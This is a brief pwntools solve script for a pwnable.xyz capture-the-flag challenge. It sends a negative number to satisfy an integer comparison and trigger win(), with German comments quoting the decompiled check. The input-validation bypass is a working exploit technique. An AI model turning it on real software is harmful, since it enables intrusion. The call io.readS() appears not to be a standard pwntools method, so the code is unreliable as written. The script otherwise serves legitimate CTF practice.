from pwn import *
import re

#context.log_level = 'debug'

#io = process('../pwnable_22')
io = remote('svc.pwnable.xyz', 30001)


io.recv()
io.sendline(b"0 -4919")
flag = io.readS()
io.close()

print(flag)




# scanf("%u %u",&local_18,&local_14);
#  if (((local_18 < 0x1337) && (local_14 < 0x1337)) && (local_18 - local_14 == 0x1337)) {
#    win();
#  } 0x1337 --> 4919 
# local_18 und 14 sind int -->32bit

